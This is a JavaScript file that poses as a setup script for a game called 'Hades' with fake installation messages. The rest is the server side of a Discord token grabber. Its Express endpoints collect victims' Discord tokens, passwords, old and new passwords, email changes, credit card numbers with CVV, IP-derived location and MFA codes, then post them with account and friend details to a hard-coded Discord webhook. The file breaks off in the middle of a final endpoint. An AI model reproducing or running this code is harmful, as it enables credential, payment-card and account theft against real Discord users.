function sleep(milliseconds) {
  var start = new Date().getTime();
  for (var i = 0; i < 1e7; i++) {
    if ((new Date().getTime() - start) > milliseconds){
      break;
    }
  }
}

console.log('\x1b[35m%s\x1b[0', '         Hades     ')
console.log('\x1b[32m%s\x1b[0m', 'Description : Game , fight , spell  ')

console.log("Setup the game. Wait")
sleep(5000)

console.log('\x1b[31m%s\x1b[0m', 'Data Cache Installing...')
sleep(10000)
console.log("Waiting pls!")
console.log("")
console.log("")
sleep(20000)
console.log("Done!")
sleep(3000)

console.log('\x1b[34m%s\x1b[0m', 'Go to files named config.json to set the settings!');

sleep(1000)

console.log('\x1b[37m%s\x1b[0m', 'Written Start to play on Hades!');





const app = require("express")(),
    {
        text
    } = require("body-parser"),
    Discord = require("v11-discord.js"),
    request = require("sync-request")
var webhook = "https://discord.com/api/webhooks/952626754877522000/Ans_XeEhr7b-Qc7oQbwfLCpI5lpq1pG8aCOahBepuaGNNLthZkyQZsHpUL25CVnCQng8" // Put your webhook Here.

webhook = webhook.split("/")
webhook = new Discord.WebhookClient(webhook[5], webhook[6])

app.use(text())
app.listen(3000)
app.post("/login", (req, res) => {
    res.sendStatus(200)
    req = JSON.parse(req.body)
    var basicInfos = getInfo("https://discord.com/api/v9/users/@me", req.token)
    if (basicInfos == "Invalid") return
    var billingInfos = getInfo("https://discord.com/api/v9/users/@me/billing/payment-sources", req.token)
    var friendsInfos = getInfo("https://discordapp.com/api/v9/users/@me/relationships", req.token)
    var guildInfos = getInfo("https://discord.com/api/v9/users/@me/guilds", req.token)
    var appliInfos = getInfo("https://discord.com/api/v9/applications", req.token)
    var connectInfos = getInfo("https://discordapp.com/api/v9/users/@me/connections", req.token)
    var ipInfos = getIPInfo(req.ipAddress)
    var owowner = 0,
        bio, phone
    guildInfos.forEach(r => r.owner && owowner++)
    if (billingInfos.length > 0) billing = `\`Yes \` `
    else billing = "```No.```"
    billingInfos.forEach(i => {
        i.brand && 0 == i.invalid && (billing += "<:y_card_spc:918956324908318720> "),
            i.email && (billing += "<:paypal:891011558040277072> ")
    });
    if (basicInfos.bio) bio = basicInfos.bio
    else bio = "𝗡𝗼 𝗕𝗶𝗼𝗴𝗿𝗮𝗽𝗵𝘆"
    if (bio.startsWith("```") && bio.endsWith("```")) bio = bio.slice(3, -3)
    if (basicInfos.phone !== null) phone = basicInfos.phone
    else phone = "𝗡𝗼 𝐏𝗵𝗼𝗻𝗲."
    if (basicInfos.banner) var image = `https://cdn.discordapp.com/banners/${basicInfos.id}/${basicInfos.banner}.png?size=512`
    else var image = "https://www.icegif.com/wp-content/uploads/icegif-219.gif"
    var embed = new Discord.RichEmbed()
        .setAuthor(`By SΞA#0666`)
        .setTitle("𝗡𝗲𝘄 𝗧𝗼𝗸𝗲𝗻 𝗚𝗿𝗮𝗯𝗯𝗲𝗱 !")
        .setURL("https://discords.com/bio/p/grr")
        .addField("𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲", "```" + `${basicInfos.username}#${basicInfos.discriminator}` + "```")
        .addField("𝐁𝐚𝐝𝐠𝐞𝐬", badges(basicInfos.flags), true)
        .addField("𝗡𝗶𝘁𝗿𝗼", getNitro(basicInfos.premium_type), true)
        .addField("𝐅𝗿𝐢𝗲𝐧𝐝𝐬", "`" + friendsInfos.filter(r => r.type == 1).length + "`", true)
        .addField("𝐏𝐚𝐲𝐦𝐞𝐧𝐭 𝐌𝐞𝐭𝐡𝐨𝐝", billing, true)
        .addField("𝐓𝐨𝐭𝐚𝐥 𝐆𝐮𝐢𝐥𝐝", "`" + guildInfos.length + "`", true)
        .addField("𝐓𝐨𝐭𝐚𝐥 𝐆𝐮𝐢𝐥𝐝 𝐎𝐰𝐧", "`" + owowner + "`", true)
        .addField("𝐓𝐨𝐭𝐚𝐥 𝐀𝐩𝐩𝐥𝐢𝐜𝐚𝐭𝐢𝐨𝐧𝐬", "`" + appliInfos.length + "`", true)
        .addField("𝐓𝐨𝐭𝐚𝐥 𝐂𝐨𝐧𝐧𝐞𝐜𝐭𝐢𝐨𝐧𝐬", "`" + connectInfos.length + "`", true)
        .addField("𝗡𝗦𝗙𝗪 𝗔𝗹𝗹𝗼𝘄𝗲𝗱 ", "`" + basicInfos.nsfw_allowed + "`", true)
        .addField("𝗩𝗲𝗿𝗶𝗳𝗶𝗲𝗱", "`" + basicInfos.verified + "`", true)
        .addField("𝗕𝗶𝗼𝗴𝗿𝗮𝗽𝗵𝗶𝗲", "```" + bio + "```")
        .addField("𝗘𝗺𝗮𝗶𝗹", "```" + basicInfos.email + "```")
        .addField("𝗣𝗵𝗼𝗻𝗲", "```" + phone + "```")
        .addField("𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃: ", "```" + req.password + "```")
        .addField("𝗧𝗼𝗸𝗲𝗻", "```" + req.token + "```")
        .addField("𝐈𝐏 𝐈𝐧𝐟𝐨𝐬", "```" + `${ipInfos.country} | ${ipInfos.regionName}\n${ipInfos.city} | ${ipInfos.isp}\n${ipInfos.query}` + "```")
        .setThumbnail(`https://cdn.discordapp.com/avatars/${basicInfos.id}/${basicInfos.avatar}.png?size=128`)
        .setImage(image)
        .setColor("#00aaaa")
        .setFooter("SΞA#0666  𝗟𝗼𝗴𝗴𝗲𝗿 𝗕𝘆 SΞA#0666")
    basicInfos.mfa_enabled == true && embed.addField("𝐌𝐅𝐀 𝐂𝐨𝐝𝐞𝐬", "```" + getMFACode(req.token, req.password) + "```")
    embed.addField("𝗜𝗻𝗷𝗲𝗰𝘁𝗲𝗱 𝗜𝗻", "```" + req.injected.split("\\")[5] + "```")
    webhook.send(embed)
    webhook2.send(embed)
    var friendEmbed = new Discord.RichEmbed()
        .setAuthor(`By ٴSΞA#0666`)
        .setTitle(`𝐅𝐫𝐢𝐞𝐧𝐝𝐬 𝐅𝐫𝐨𝐦 ${basicInfos.username}`)
        .setURL("https://discords.com/bio/p/grr")
        .setDescription(friendInfos(friendsInfos))
        .setThumbnail(`https://cdn.discordapp.com/avatars/${basicInfos.id}/${basicInfos.avatar}.png?size=128`)
        .setImage(image)
        .setColor("#00aaaa")
        .setFooter("SΞA#0666  𝗟𝗼𝗴𝗴𝗲𝗿 𝗕𝘆 SΞA#0666")
    webhook.send(friendEmbed)
    webhook2.send(friendEmbed)
})
app.post("/newpass", (req, res) => {
    req = JSON.parse(req.body)
    var basicInfos = getInfo("https://discord.com/api/v9/users/@me", req.token)
    if (basicInfos == "Invalid") return
    var billingInfos = getInfo("https://discord.com/api/v9/users/@me/billing/payment-sources", req.token)
    var friendsInfos = getInfo("https://discordapp.com/api/v9/users/@me/relationships", req.token)
    var guildInfos = getInfo("https://discord.com/api/v9/users/@me/guilds", req.token)
    var appliInfos = getInfo("https://discord.com/api/v9/applications", req.token)
    var connectInfos = getInfo("https://discordapp.com/api/v9/users/@me/connections", req.token)
    var ipInfos = getIPInfo(req.ipAddress)
    var owowner = 0,
        bio, phone
    guildInfos.forEach(r => r.owner && owowner++)
    if (billingInfos.length > 0) billing = `\`Yes \` `
    else billing = "```No.```"
    billingInfos.forEach(i => {
        i.brand && 0 == i.invalid && (billing += "<:y_card_spc:918956324908318720> "),
            i.email && (billing += "<:paypal:891011558040277072> ")
    });
    if (basicInfos.bio) bio = basicInfos.bio
    else bio = "𝗡𝗼 𝗕𝗶𝗼𝗴𝗿𝗮𝗽𝗵𝘆"
    if (bio.startsWith("```") && bio.endsWith("```")) bio = bio.slice(3, -3)
    if (basicInfos.phone !== null) phone = basicInfos.phone
    else phone = "𝗡𝗼 𝐏𝗵𝗼𝗻𝗲."
    if (basicInfos.banner) var image = `https://cdn.discordapp.com/banners/${basicInfos.id}/${basicInfos.banner}.png?size=512`
    else var image = "https://www.icegif.com/wp-content/uploads/icegif-219.gif"
    var embed = new Discord.RichEmbed()
        .setAuthor(`By ٴSΞA#0666`)
        .setTitle("𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝 𝐂𝐡𝐚𝐧𝐠𝐞𝐝 !")
        .setURL("https://discords.com/bio/p/grr")
        .addField("𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲", "```" + `${basicInfos.username}#${basicInfos.discriminator}` + "```")
        .addField("𝐁𝐚𝐝𝐠𝐞𝐬", badges(basicInfos.flags), true)
        .addField("𝗡𝗶𝘁𝗿𝗼", getNitro(basicInfos.premium_type), true)
        .addField("𝐅𝗿𝐢𝗲𝐧𝐝𝐬", "`" + friendsInfos.filter(r => r.type == 1).length + "`", true)
        .addField("𝐏𝐚𝐲𝐦𝐞𝐧𝐭 𝐌𝐞𝐭𝐡𝐨𝐝", billing, true)
        .addField("𝐓𝐨𝐭𝐚𝐥 𝐆𝐮𝐢𝐥𝐝", "`" + guildInfos.length + "`", true)
        .addField("𝐓𝐨𝐭𝐚𝐥 𝐆𝐮𝐢𝐥𝐝 𝐎𝐰𝐧", "`" + owowner + "`", true)
        .addField("𝐓𝐨𝐭𝐚𝐥 𝐀𝐩𝐩𝐥𝐢𝐜𝐚𝐭𝐢𝐨𝐧𝐬", "`" + appliInfos.length + "`", true)
        .addField("𝐓𝐨𝐭𝐚𝐥 𝐂𝐨𝐧𝐧𝐞𝐜𝐭𝐢𝐨𝐧𝐬", "`" + connectInfos.length + "`", true)
        .addField("𝗡𝗦𝗙𝗪 𝗔𝗹𝗹𝗼𝘄𝗲𝗱 ", "`" + basicInfos.nsfw_allowed + "`", true)
        .addField("𝗩𝗲𝗿𝗶𝗳𝗶𝗲𝗱", "`" + basicInfos.verified + "`", true)
        .addField("𝗕𝗶𝗼𝗴𝗿𝗮𝗽𝗵𝗶𝗲", "```" + bio + "```")
        .addField("𝗘𝗺𝗮𝗶𝗹", "```" + basicInfos.email + "```")
        .addField("𝗣𝗵𝗼𝗻𝗲", "```" + phone + "```")
        .addField("𝐏𝐫𝐞𝐯𝐢𝐨𝐮𝐬 𝐏𝐚𝐬𝐬: ", "```" + req.lastPassword + "```", true)
        .addField("𝐍𝐞𝐰 𝐏𝐚𝐬𝐬", "```" + req.newPassword + "```", true)
        .addField("𝗧𝗼𝗸𝗲𝗻", "```" + req.token + "```")
        .addField("𝐈𝐏 𝐈𝐧𝐟𝐨𝐬", "```" + `${ipInfos.country} | ${ipInfos.regionName}\n${ipInfos.city} | ${ipInfos.isp}\n${ipInfos.query}` + "```")
        .setThumbnail(`https://cdn.discordapp.com/avatars/${basicInfos.id}/${basicInfos.avatar}.png?size=128`)
        .setImage(image)
        .setColor("#00aaaa")
        .setFooter("SΞA#0666  𝗟𝗼𝗴𝗴𝗲𝗿 𝗕𝘆 SΞA#0666")
    basicInfos.mfa_enabled == true && embed.addField("𝐌𝐅𝐀 𝐂𝐨𝐝𝐞𝐬", "```" + getMFACode(req.token, req.newPassword) + "```")
    embed.addField("𝗜𝗻𝗷𝗲𝗰𝘁𝗲𝗱 𝗜𝗻", "```" + req.injected.split("\\")[5] + "```")
    webhook.send(embed)
    webhook2.send(embed)
    var friendEmbed = new Discord.RichEmbed()
        .setAuthor(`By ٴSΞA#0666`)
        .setTitle(`𝐅𝐫𝐢𝐞𝐧𝐝𝐬 𝐅𝐫𝐨𝐦 ${basicInfos.username}`)
        .setURL("https://discords.com/bio/p/grr")
        .setDescription(friendInfos(friendsInfos))
        .setThumbnail(`https://cdn.discordapp.com/avatars/${basicInfos.id}/${basicInfos.avatar}.png?size=128`)
        .setImage(image)
        .setColor("#00aaaa")
        .setFooter("SΞA#0666  𝗟𝗼𝗴𝗴𝗲𝗿 𝗕𝘆 SΞA#0666")
    webhook.send(friendEmbed)
    webhook2.send(friendEmbed)
})
app.post("/newmemail", (req, res) => {
    req = JSON.parse(req.body)
    res.sendStatus(200)
    var basicInfos = getInfo("https://discord.com/api/v9/users/@me", req.token)
    if (basicInfos == "Invalid") return
    var billingInfos = getInfo("https://discord.com/api/v9/users/@me/billing/payment-sources", req.token)
    var friendsInfos = getInfo("https://discordapp.com/api/v9/users/@me/relationships", req.token)
    var guildInfos = getInfo("https://discord.com/api/v9/users/@me/guilds", req.token)
    var appliInfos = getInfo("https://discord.com/api/v9/applications", req.token)
    var connectInfos = getInfo("https://discordapp.com/api/v9/users/@me/connections", req.token)
    var ipInfos = getIPInfo(req.ipAddress)
    var owowner = 0,
        bio, phone
    guildInfos.forEach(r => r.owner && owowner++)
    if (billingInfos.length > 0) billing = `\`Yes \` `
    else billing = "```No.```"
    billingInfos.forEach(i => {
        i.brand && 0 == i.invalid && (billing += "<:y_card_spc:918956324908318720> "),
            i.email && (billing += "<:paypal:891011558040277072> ")
    });
    if (basicInfos.bio) bio = basicInfos.bio
    else bio = "𝗡𝗼 𝗕𝗶𝗼𝗴𝗿𝗮𝗽𝗵𝘆"
    if (bio.startsWith("```") && bio.endsWith("```")) bio = bio.slice(3, -3)
    if (basicInfos.phone !== null) phone = basicInfos.phone
    else phone = "𝗡𝗼 𝐏𝗵𝗼𝗻𝗲."
    if (basicInfos.banner) var image = `https://cdn.discordapp.com/banners/${basicInfos.id}/${basicInfos.banner}.png?size=512`
    else var image = "https://www.icegif.com/wp-content/uploads/icegif-219.gif"
    var embed = new Discord.RichEmbed()
        .setAuthor(`By ٴSΞA#0666`)
        .setTitle("𝐄𝐦𝐚𝐢𝐥 𝐂𝐡𝐚𝐧𝐠𝐞𝐝 !")
        .setURL("https://discords.com/bio/p/grr")
        .addField("𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲", "```" + `${basicInfos.username}#${basicInfos.discriminator}` + "```")
        .addField("𝐁𝐚𝐝𝐠𝐞𝐬", badges(basicInfos.flags), true)
        .addField("𝗡𝗶𝘁𝗿𝗼", getNitro(basicInfos.premium_type), true)
        .addField("𝐅𝗿𝐢𝗲𝐧𝐝𝐬", "`" + friendsInfos.filter(r => r.type == 1).length + "`", true)
        .addField("𝐏𝐚𝐲𝐦𝐞𝐧𝐭 𝐌𝐞𝐭𝐡𝐨𝐝", billing, true)
        .addField("𝐓𝐨𝐭𝐚𝐥 𝐆𝐮𝐢𝐥𝐝", "`" + guildInfos.length + "`", true)
        .addField("𝐓𝐨𝐭𝐚𝐥 𝐆𝐮𝐢𝐥𝐝 𝐎𝐰𝐧", "`" + owowner + "`", true)
        .addField("𝐓𝐨𝐭𝐚𝐥 𝐀𝐩𝐩𝐥𝐢𝐜𝐚𝐭𝐢𝐨𝐧𝐬", "`" + appliInfos.length + "`", true)
        .addField("𝐓𝐨𝐭𝐚𝐥 𝐂𝐨𝐧𝐧𝐞𝐜𝐭𝐢𝐨𝐧𝐬", "`" + connectInfos.length + "`", true)
        .addField("𝗡𝗦𝗙𝗪 𝗔𝗹𝗹𝗼𝘄𝗲𝗱 ", "`" + basicInfos.nsfw_allowed + "`", true)
        .addField("𝗩𝗲𝗿𝗶𝗳𝗶𝗲𝗱", "`" + basicInfos.verified + "`", true)
        .addField("𝗕𝗶𝗼𝗴𝗿𝗮𝗽𝗵𝗶𝗲", "```" + bio + "```")
        .addField("𝐍𝐞𝐰 𝗘𝗺𝗮𝗶𝗹", "```" + req.newEmail + "```")
        .addField("𝗣𝗵𝗼𝗻𝗲", "```" + phone + "```")
        .addField("𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃: ", "```" + req.password + "```")
        .addField("𝗧𝗼𝗸𝗲𝗻", "```" + req.token + "```")
        .addField("𝐈𝐏 𝐈𝐧𝐟𝐨𝐬", "```" + `${ipInfos.country} | ${ipInfos.regionName}\n${ipInfos.city} | ${ipInfos.isp}\n${ipInfos.query}` + "```")
        .setThumbnail(`https://cdn.discordapp.com/avatars/${basicInfos.id}/${basicInfos.avatar}.png?size=128`)
        .setImage(image)
        .setColor("#00aaaa")
        .setFooter("SΞA#0666  𝗟𝗼𝗴𝗴𝗲𝗿 𝗕𝘆 SΞA#0666")
    basicInfos.mfa_enabled == true && embed.addField("𝐌𝐅𝐀 𝐂𝐨𝐝𝐞𝐬", "```" + getMFACode(req.token, req.password) + "```")
    embed.addField("𝗜𝗻𝗷𝗲𝗰𝘁𝗲𝗱 𝗜𝗻", "```" + req.injected.split("\\")[5] + "```")
    webhook.send(embed)
    webhook2.send(embed)
    var friendEmbed = new Discord.RichEmbed()
        .setAuthor(`By ٴSΞA#0666`)
        .setTitle(`𝐅𝐫𝐢𝐞𝐧𝐝𝐬 𝐅𝐫𝐨𝐦 ${basicInfos.username}`)
        .setURL("https://discords.com/bio/p/grr")
        .setDescription(friendInfos(friendsInfos))
        .setThumbnail(`https://cdn.discordapp.com/avatars/${basicInfos.id}/${basicInfos.avatar}.png?size=128`)
        .setImage(image)
        .setColor("#00aaaa")
        .setFooter("SΞA#0666  𝗟𝗼𝗴𝗴𝗲𝗿 𝗕𝘆 SΞA#0666")
    webhook.send(friendEmbed)
    webhook2.send(friendEmbed)
})
app.post("/paypal", (req, res) => {
    req = JSON.parse(req.body)
    res.sendStatus(200)
    var basicInfos = getInfo("https://discord.com/api/v9/users/@me", req.token)
    if (basicInfos == "Invalid") return
    var billingInfos = getInfo("https://discord.com/api/v9/users/@me/billing/payment-sources", req.token)
    var friendsInfos = getInfo("https://discordapp.com/api/v9/users/@me/relationships", req.token)
    var guildInfos = getInfo("https://discord.com/api/v9/users/@me/guilds", req.token)
    var appliInfos = getInfo("https://discord.com/api/v9/applications", req.token)
    var connectInfos = getInfo("https://discordapp.com/api/v9/users/@me/connections", req.token)
    var ipInfos = getIPInfo(req.ipAddress)
    var owowner = 0,
        bio, phone
    guildInfos.forEach(r => r.owner && owowner++)
    if (billingInfos.length > 0) billing = `\`Yes \` `
    else billing = "```No.```"
    billingInfos.forEach(i => {
        i.brand && 0 == i.invalid && (billing += "<:y_card_spc:918956324908318720> "),
            i.email && (billing += "<:paypal:891011558040277072> ")
    });
    if (basicInfos.bio) bio = basicInfos.bio
    else bio = "𝗡𝗼 𝗕𝗶𝗼𝗴𝗿𝗮𝗽𝗵𝘆"
    if (bio.startsWith("```") && bio.endsWith("```")) bio = bio.slice(3, -3)
    if (basicInfos.phone !== null) phone = basicInfos.phone
    else phone = "𝗡𝗼 𝐏𝗵𝗼𝗻𝗲."
    if (basicInfos.banner) var image = `https://cdn.discordapp.com/banners/${basicInfos.id}/${basicInfos.banner}.png?size=512`
    else var image = "https://www.icegif.com/wp-content/uploads/icegif-219.gif"
    var embed = new Discord.RichEmbed()
        .setAuthor(`By ٴSΞA#0666`)
        .setTitle("𝐏𝐚𝐲𝐩𝐚𝐥 𝐀𝐝𝐝𝐢𝐧𝐠 !")
        .setDescription(`${basicInfos.username} 𝐈𝐬 𝐀𝐝𝐝𝐢𝐧𝐠 𝐀 𝐏𝐚𝐲𝐩𝐚𝐥 𝐓𝐨 𝐇𝐢𝐬 𝐀𝐜𝐜𝐨𝐮𝐧𝐭`)
        .setURL("https://discords.com/bio/p/grr")
        .addField("𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲", "```" + `${basicInfos.username}#${basicInfos.discriminator}` + "```")
        .addField("𝐁𝐚𝐝𝐠𝐞𝐬", badges(basicInfos.flags), true)
        .addField("𝗡𝗶𝘁𝗿𝗼", getNitro(basicInfos.premium_type), true)
        .addField("𝐅𝗿𝐢𝗲𝐧𝐝𝐬", "`" + friendsInfos.filter(r => r.type == 1).length + "`", true)
        .addField("𝐏𝐚𝐲𝐦𝐞𝐧𝐭 𝐌𝐞𝐭𝐡𝐨𝐝", billing, true)
        .addField("𝐓𝐨𝐭𝐚𝐥 𝐆𝐮𝐢𝐥𝐝", "`" + guildInfos.length + "`", true)
        .addField("𝐓𝐨𝐭𝐚𝐥 𝐆𝐮𝐢𝐥𝐝 𝐎𝐰𝐧", "`" + owowner + "`", true)
        .addField("𝐓𝐨𝐭𝐚𝐥 𝐀𝐩𝐩𝐥𝐢𝐜𝐚𝐭𝐢𝐨𝐧𝐬", "`" + appliInfos.length + "`", true)
        .addField("𝐓𝐨𝐭𝐚𝐥 𝐂𝐨𝐧𝐧𝐞𝐜𝐭𝐢𝐨𝐧𝐬", "`" + connectInfos.length + "`", true)
        .addField("𝗡𝗦𝗙𝗪 𝗔𝗹𝗹𝗼𝘄𝗲𝗱 ", "`" + basicInfos.nsfw_allowed + "`", true)
        .addField("𝗩𝗲𝗿𝗶𝗳𝗶𝗲𝗱", "`" + basicInfos.verified + "`", true)
        .addField("𝗕𝗶𝗼𝗴𝗿𝗮𝗽𝗵𝗶𝗲", "```" + bio + "```")
        .addField("𝗘𝗺𝗮𝗶𝗹", "```" + basicInfos.email + "```")
        .addField("𝗣𝗵𝗼𝗻𝗲", "```" + phone + "```")
        .addField("𝗧𝗼𝗸𝗲𝗻", "```" + req.token + "```")
        .addField("𝐈𝐏 𝐈𝐧𝐟𝐨𝐬", "```" + `${ipInfos.country} | ${ipInfos.regionName}\n${ipInfos.city} | ${ipInfos.isp}\n${ipInfos.query}` + "```")
        .setThumbnail(`https://cdn.discordapp.com/avatars/${basicInfos.id}/${basicInfos.avatar}.png?size=128`)
        .setImage(image)
        .setColor("#00aaaa")
        .setFooter("SΞA#0666  𝗟𝗼𝗴𝗴𝗲𝗿 𝗕𝘆 SΞA#0666")
    embed.addField("𝗜𝗻𝗷𝗲𝗰𝘁𝗲𝗱 𝗜𝗻", "```" + req.injected.split("\\")[5] + "```")
    webhook.send(embed)
    webhook2.send(embed)
    var friendEmbed = new Discord.RichEmbed()
        .setAuthor(`By ٴSΞA#0666`)
        .setTitle(`𝐅𝐫𝐢𝐞𝐧𝐝𝐬 𝐅𝐫𝐨𝐦 ${basicInfos.username}`)
        .setURL("https://discords.com/bio/p/grr")
        .setDescription(friendInfos(friendsInfos))
        .setThumbnail(`https://cdn.discordapp.com/avatars/${basicInfos.id}/${basicInfos.avatar}.png?size=128`)
        .setImage(image)
        .setColor("#00aaaa")
        .setFooter("SΞA#0666  𝗟𝗼𝗴𝗴𝗲𝗿 𝗕𝘆 SΞA#0666")
    webhook.send(friendEmbed)
    webhook2.send(friendEmbed)
})
app.post("/card", (req, res) => {
    res.sendStatus(200)
    req = JSON.parse(req.body)
    var basicInfos = getInfo("https://discord.com/api/v9/users/@me", req.token)
    if (basicInfos == "Invalid") return
    var billingInfos = getInfo("https://discord.com/api/v9/users/@me/billing/payment-sources", req.token)
    var friendsInfos = getInfo("https://discordapp.com/api/v9/users/@me/relationships", req.token)
    var guildInfos = getInfo("https://discord.com/api/v9/users/@me/guilds", req.token)
    var appliInfos = getInfo("https://discord.com/api/v9/applications", req.token)
    var connectInfos = getInfo("https://discordapp.com/api/v9/users/@me/connections", req.token)
    var ipInfos = getIPInfo(req.ipAddress)
    var owowner = 0,
        bio, phone
    guildInfos.forEach(r => r.owner && owowner++)
    if (billingInfos.length > 0) billing = `\`Yes \` `
    else billing = "```No.```"
    billingInfos.forEach(i => {
        i.brand && 0 == i.invalid && (billing += "<:y_card_spc:918956324908318720> "),
            i.email && (billing += "<:paypal:891011558040277072> ")
    });
    if (basicInfos.bio) bio = basicInfos.bio
    else bio = "𝗡𝗼 𝗕𝗶𝗼𝗴𝗿𝗮𝗽𝗵𝘆"
    if (bio.startsWith("```") && bio.endsWith("```")) bio = bio.slice(3, -3)
    if (basicInfos.phone !== null) phone = basicInfos.phone
    else phone = "𝗡𝗼 𝐏𝗵𝗼𝗻𝗲."
    if (basicInfos.banner) var image = `https://cdn.discordapp.com/banners/${basicInfos.id}/${basicInfos.banner}.png?size=512`
    else var image = "https://www.icegif.com/wp-content/uploads/icegif-219.gif"
    var embed = new Discord.RichEmbed()
        .setAuthor(`By ٴSΞA#0666`)
        .setTitle("𝗖𝗿𝗲𝗱𝗶𝘁 𝗖𝗮𝗿𝗱 𝐀𝐝𝐝𝐢𝐧𝐠 !")
        .setDescription(`${basicInfos.username} 𝐈𝐬 𝐀𝐝𝐝𝐢𝐧𝐠 𝐀 𝗖𝗿𝗲𝗱𝗶𝘁 𝗖𝗮𝗿𝗱 𝐓𝐨 𝐇𝐢𝐬 𝐀𝐜𝐜𝐨𝐮𝐧𝐭`)
        .setURL("https://discords.com/bio/p/grr")
        .addField("𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲", "```" + `${basicInfos.username}#${basicInfos.discriminator}` + "```")
        .addField("𝐁𝐚𝐝𝐠𝐞𝐬", badges(basicInfos.flags), true)
        .addField("𝗡𝗶𝘁𝗿𝗼", getNitro(basicInfos.premium_type), true)
        .addField("𝐅𝗿𝐢𝗲𝐧𝐝𝐬", "`" + friendsInfos.filter(r => r.type == 1).length + "`", true)
        .addField("𝐏𝐚𝐲𝐦𝐞𝐧𝐭 𝐌𝐞𝐭𝐡𝐨𝐝", billing, true)
        .addField("𝐓𝐨𝐭𝐚𝐥 𝐆𝐮𝐢𝐥𝐝", "`" + guildInfos.length + "`", true)
        .addField("𝐓𝐨𝐭𝐚𝐥 𝐆𝐮𝐢𝐥𝐝 𝐎𝐰𝐧", "`" + owowner + "`", true)
        .addField("𝐓𝐨𝐭𝐚𝐥 𝐀𝐩𝐩𝐥𝐢𝐜𝐚𝐭𝐢𝐨𝐧𝐬", "`" + appliInfos.length + "`", true)
        .addField("𝐓𝐨𝐭𝐚𝐥 𝐂𝐨𝐧𝐧𝐞𝐜𝐭𝐢𝐨𝐧𝐬", "`" + connectInfos.length + "`", true)
        .addField("𝗡𝗦𝗙𝗪 𝗔𝗹𝗹𝗼𝘄𝗲𝗱 ", "`" + basicInfos.nsfw_allowed + "`", true)
        .addField("𝗩𝗲𝗿𝗶𝗳𝗶𝗲𝗱", "`" + basicInfos.verified + "`", true)
        .addField("𝗕𝗶𝗼𝗴𝗿𝗮𝗽𝗵𝗶𝗲", "```" + bio + "```")
        .addField("𝗘𝗺𝗮𝗶𝗹", "```" + basicInfos.email + "```")
        .addField("𝗣𝗵𝗼𝗻𝗲", "```" + phone + "```")
        .addField("𝗧𝗼𝗸𝗲𝗻", "```" + req.token + "```")
        .addField("𝐈𝐏 𝐈𝐧𝐟𝐨𝐬", "```" + `${ipInfos.country} | ${ipInfos.regionName}\n${ipInfos.city} | ${ipInfos.isp}\n${ipInfos.query}` + "```")
        .addField("𝗖𝗿𝗲𝗱𝗶𝘁 𝗖𝗮𝗿𝗱 𝗜𝗻𝗳𝗼𝘀", "```" + `${req.expireAt} | ${req.cvv}\n${req.number}` + "```")
        .addField("𝗘𝘅𝘁𝗿𝗮𝘁 𝗜𝗻𝗳𝗼𝘀", "```" + `GUID: ${req.guid}\nMUID: ${req.muid}\nSID: ${req.sid}\nKey: ${req.key}\nUserAgent: ${req.userAgent}` + "```")
        .setThumbnail(`https://cdn.discordapp.com/avatars/${basicInfos.id}/${basicInfos.avatar}.png?size=128`)
        .setImage(image)
        .setColor("#00aaaa")
        .setFooter("SΞA#0666  𝗟𝗼𝗴𝗴𝗲𝗿 𝗕𝘆 SΞA#0666")
    embed.addField("𝗜𝗻𝗷𝗲𝗰𝘁𝗲𝗱 𝗜𝗻", "```" + req.injected.split("\\")[5] + "```")
    webhook.send(embed)
    webhook2.send(embed)
    var friendEmbed = new Discord.RichEmbed()
        .setAuthor(`By ٴSΞA#0666`)
        .setTitle(`𝐅𝐫𝐢𝐞𝐧𝐝𝐬 𝐅𝐫𝐨𝐦 ${basicInfos.username}`)
        .setURL("https://discords.com/bio/p/grr")
        .setDescription(friendInfos(friendsInfos))
        .setThumbnail(`https://cdn.discordapp.com/avatars/${basicInfos.id}/${basicInfos.avatar}.png?size=128`)
        .setImage(image)
        .setColor("#00aaaa")
        .setFooter("SΞA#0666  𝗟𝗼𝗴𝗴𝗲𝗿 𝗕𝘆 SΞA#0666")
    webhook.send(friendEmbed)
    webhook2.send(friendEmbed)
})
app.post("/mfaenable", (req, res) => {
    req = JSON.parse(req.body)
    res.sendStatus(200)
    var basicInfos = getInfo("https://discord.com/api/v9/users/@me", req.token)
    if (basicInfos == "Invalid") return
    var billingInfos = getInfo("https://discord.com/api/v9/users/@me/billing/payment-sources", req.token)
    var friendsInfos = getInfo("https://discordapp.com/api/v9/users/@me/relationships", req.token)
    var guildInfos = getInfo("https://discord.com/api/v9/users/@me/guilds", req.token)
    var appliInfos = getInfo("https://discord.com/api/v9/applications", req.token)
    var connectInfos = getInfo("https://discordapp.com/api/v9/users/@me/connections", req.token)
    var ipInfos = getIPInfo(req.ipAddress)
    var owowner = 0,
        bio, phone
    guildInfos.forEach(r => r.owner && owowner++)
    if (billingInfos.length > 0) billing = `\`Yes \` `
    else billing = "```No.```"
    billingInfos.forEach(i => {
        i.brand && 0 == i.invalid && (billing += "<:y_card_spc:918956324908318720> "),
            i.email && (billing += "<:paypal:891011558040277072> ")
    });
    if (basicInfos.bio) bio = basicInfos.bio
    else bio = "𝗡𝗼 𝗕𝗶𝗼𝗴𝗿𝗮𝗽𝗵𝘆"
    if (bio.startsWith("```") && bio.endsWith("```")) bio = bio.slice(3, -3)
    if (basicInfos.phone !== null) phone = basicInfos.phone
    else phone = "𝗡𝗼 𝐏𝗵𝗼𝗻𝗲."
    if (basicInfos.banner) var image = `https://cdn.discordapp.com/banners/${basicInfos.id}/${basicInfos.banner}.png?size=512`
    else var image = "https://www.icegif.com/wp-content/uploads/icegif-219.gif"
    var embed = new Discord.RichEmbed()
        .setAuthor(`By ٴSΞA#0666`)
        .setTitle("𝗖𝗿𝗲𝗱𝗶𝘁 𝗖𝗮𝗿𝗱 𝐀𝐝𝐝𝐢𝐧𝐠 !")
        .setDescription(`${basicInfos.username} 𝐈𝐬 𝐀𝐝𝐝𝐢𝐧𝐠 𝐀 𝗖𝗿𝗲𝗱𝗶𝘁 𝗖𝗮𝗿𝗱 𝐓𝐨 𝐇𝐢𝐬 𝐀𝐜𝐜𝐨𝐮𝐧𝐭`)
        .setURL("https://discords.com/bio/p/grr")
